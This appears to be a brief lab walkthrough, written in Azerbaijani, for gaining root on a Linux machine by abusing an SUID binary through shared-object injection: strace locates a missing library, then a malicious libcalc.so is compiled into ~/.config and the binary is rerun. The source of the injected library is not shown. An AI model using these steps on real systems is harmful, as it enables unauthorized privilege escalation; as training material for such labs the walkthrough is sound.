## eger biz suid so suid icazesi gormusukse
    /usr/local/bin/suid-so
## bu kommandi verdikden sonra 
    strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
## daha sonra biz home userde .config qovluqu yaradiriq
    mkdir /home/user/.config
    cd .config
## daha sonraa bu emrini runlayiriq
    gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
## ve ardiyca 
    /usr/local/bin/suid-so
## ve artiq rootsan

